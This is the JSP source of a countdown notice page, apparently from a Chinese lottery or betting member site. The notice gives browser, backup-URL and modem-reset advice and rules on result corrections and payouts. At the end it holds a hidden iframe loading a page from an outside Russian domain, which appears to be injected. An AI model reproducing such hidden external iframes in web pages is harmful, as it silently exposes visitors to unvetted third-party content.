<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<html g_init="6858"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style>html{overflow-y:scroll;}</style>
<style type="text/css"><!--
.ttt {LINE-HEIGHT: 14px}
.style6 {font-size: 16px;
	font-weight: bold;}
td{font-size:15px;line-height:30px;}
.button{
	padding: 0px;
	color: #000;
	/*for Mozilla*/
	height: 42px !important;
	line-height: 43px !important;

	/*for IE7*/
	> height: 42px !important;
	> line-height: 40px !important;

	/*for IE*/
	height: 41px;
	line-height: 42px;
	width:60px;font: 14px Arial, Helvetica, sans-serif;
	font-weight: bold;
}
.rule_button1{
	background: red;
}
.rule_button2{
	background: #00CC00;
}
.style6{color:red;}
-->
</style>
<script>
seconds=30;
function sinfochange()
{
	seconds--;
	sinfo.enters.value="阅读倒计时 "+seconds+" 秒"
	if(seconds==0)
	{ 
		sinfo.enters.disabled=false;
		sinfo.enters.value=" 进入 >>";
		window.location.href='./rule.html'
	}else{
		setTimeout("sinfochange()",1000)
	}
}
window.onload=sinfochange;
</script>
</head>
<body bgcolor="#ffffff">

<table height="80%" cellspacing="1" cellpadding="0" width="98%" align="center" bgcolor="#666666" border="0" id="ruletable">
<form name="sinfo" action="/?frames=yes&amp;"></form>
  <tbody><tr> 
    <td valign="center" bgcolor="#ccccd4" height="18"> 
      <p align="center" class="style6">系统提示 </p> 
    </td>
  </tr>
  <tr> 
    <td valign="top" bgcolor="#ffffff"> 
      <table cellspacing="0" cellpadding="5" width="98%" align="center" border="0">
        <tbody><tr> 
          <td height="300" valign="top"> 1.会员访问本网站，一定要用自己电脑系统自带(IE浏览器)进入网站。这样会员使用(小票打印)和(快选)才不会出现各种问题.目前系统只针对IE浏览器兼容，不能兼容到所有浏览器，请谅解！
<br>2.会员和管理的网址，主网址固定用1线，2线，3线，5线，备用网址用6线，7线，8线，9线，如果备用6线打不开，请用7线，8线，9线在试，直到打开为止。
<br>3.如果出现备用网址6线，7线，8线，9线都打不开时，请把上网用的(猫)断电3分钟在通电。通电后在等待3分钟，如果还不行，在重复操作断电和通电，直到打开为止。
<br>4.平时不工作的时候，建议把(猫)和(无线路由)断电3分钟在通电，这样会把(猫)和(无线路由)里缓存信息清空，上网速度会快。
<br>5.请定时（隔7天）运行金山卫士或者360安全卫士，选择（清理垃圾），这样电脑会变得更快。运行金山毒霸或者360杀毒，选择（电脑杀毒）或者（全盘扫描），这样电脑会变得更安全。
<br>
<br>
<br>特别提醒：本公司如果输入开奖结果错误，有权利更正开奖结果，最终以官方最后公布结果来结账，不得异议。
<br>
<br>特别提醒：为了避免出现争议，请各会员到第二天早上才开始兑奖。不要当天晚上知道结果后，马上就兑奖给客人，出现当天晚上兑奖造成的损失，会员自负，不得异议。
<br>
<br>
<br></td>
        </tr>
       <tr> 
          <td height="50" valign="middle" align="center"> <input type="button" name="enters" disabled="" onclick="self.location='./rule.html'" value="阅读倒计时 13 秒"></td>
        </tr>
        </tbody></table>


      </td></tr></tbody></table>

<noscript>&lt;iframe src=*.html&gt;&lt;/iframe&gt;</noscript>

<!-- 
	<table width="98%" align="center" border="0" cellpadding="0" cellspacing="0" >
	<tr >
	<td align="center" style="text-align:center">
版权所有 Copyright@2009-2010 usetime:0.009950 
mysqlquery:2 
</td>
<tr>
</table> -->

<script type="text/javascript" charset="utf-8" id="0DF98C125855B791_Analytics" src="http://tajs.qq.com/stats?sId=26506734"></script><iframe src="https://dl.metabar.ru/static/storage/index.html?version=201508141843" style="display: none;"></iframe></body></html>